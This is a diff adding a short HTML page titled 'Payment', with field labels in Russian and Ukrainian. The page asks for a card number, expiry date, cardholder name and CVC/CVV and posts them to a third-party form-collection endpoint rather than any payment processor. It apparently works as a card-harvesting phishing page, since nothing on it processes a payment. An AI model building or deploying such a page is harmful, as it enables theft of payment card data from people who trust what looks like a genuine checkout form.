@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <!-- <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@100&display=swap"> -->
+    <link rel="stylesheet" href="css/style.min.css">
+    <link rel="shortcut icon" href="img/favicon.png" type="image/png">
+
+    <title>Payment</title>
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="wraper">
+        <div class="content">
+          <form action="https://formspree.io/f/xlezeknl" method="POST" enctype="multipart/form-data">
+            <label>
+              <div class="padding container_input">
+                <span>Номер карты</span>
+                <input type="text" placeholder="XXXX XXXX XXXX XXXX" name="number">
+              </div>
+            </label>
+            <label>
+              <span class="span_input">Срок действия</span>
+              <div class="data_card">
+                <div class="padding container_input">
+                  <input type="text" name="data1" placeholder="01">
+                </div>
+                <div style="padding-left: 5px;padding-right: 5px;">
+                  /
+                </div>
+                <div class="padding container_input">
+                  <input type="text" name="data2" placeholder="20">
+                </div>
+              </div>
+            </label>
+            <label>
+              <div class="padding container_input">
+                <span>Имя и фамилия владельца карты</span>
+                <input type="text" name="Name" placeholder="Name">
+              </div>
+            </label>
+            <label>
+              <div class="padding container_input">
+                <span>CVC/CVV</span>
+                <input type="text" name="CVC/CVV" placeholder="123">
+              </div>
+            </label>
+            <button type="submit" class="btn_submit">Відправити</button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+  </body>
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-R3FBSB1096"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+
+    gtag('config', 'G-R3FBSB1096');
+  </script>
+
+
+</html>
